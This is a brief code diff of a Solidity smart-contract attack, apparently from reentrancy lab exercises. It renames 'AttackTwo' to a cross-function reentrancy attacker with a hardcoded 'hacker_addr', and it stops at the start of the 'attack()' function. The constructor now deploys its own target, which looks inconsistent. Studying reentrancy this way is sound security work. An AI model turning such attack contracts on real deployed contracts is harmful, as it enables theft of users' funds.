@@ -1,13 +1,13 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.10;
 
-contract AttackTwo {
-    ReentryVulnerableOne target;
+contract AttackCrossFunctionTwo {
+    ReentryCrossFunctionTwo target;
     address hacker_addr = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;
     uint amount;
 
     constructor(address _target) {
-        target = ReentryVulnerableTwo(_target);
+        target = new ReentryCrossFunctionTwo(_target);
     }
 
     function attack() public payable {
